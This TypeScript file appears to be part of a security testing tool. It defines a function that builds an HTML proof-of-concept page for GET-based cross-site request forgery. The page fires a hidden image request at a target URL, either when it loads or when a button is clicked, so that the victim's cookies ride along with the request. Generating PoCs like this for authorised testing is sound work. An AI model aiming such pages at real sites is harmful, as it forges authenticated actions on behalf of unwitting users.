import { ParsedRequest } from '../../types';
import { PocGeneratorOptions, escapeHtml, escapeJsString } from './types';

/**
 * Generates an Image Beacon PoC for GET based CSRF vulnerabilities.
 * Browser automatically executes GET request and attaches ambient cookies upon DOM insertion.
 */
export function generateImageBeaconPoc(
  request: ParsedRequest,
  options: Partial<PocGeneratorOptions> = {}
): string {
  const autoSubmit = options.autoSubmit !== false;
  const targetUrl = request.url;

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>GET Image Beacon CSRF PoC</title>
</head>
<body style="font-family: sans-serif; padding: 30px;">
  <h3>Zero-Click Image Beacon CSRF Demonstration</h3>
  <p>Target: <code>${escapeHtml(targetUrl)}</code></p>
  <div id="log">Payload status: Armed...</div>

  ${
    autoSubmit
      ? `<!-- Image beacon triggered immediately upon browser HTML parse -->
  <img src="${escapeHtml(
    targetUrl
  )}" width="1" height="1" style="display:none;" onerror="document.getElementById('log').innerText='Request dispatched to target via image tag';" />`
      : `<button onclick="fireBeacon()">Dispatch Beacon</button>
  <script>
    function fireBeacon() {
      const beacon = new Image();
      beacon.src = ${escapeJsString(targetUrl)};
      document.getElementById('log').innerText = 'Dispatched beacon request.';
    }
  </script>`
  }
</body>
</html>`;
}
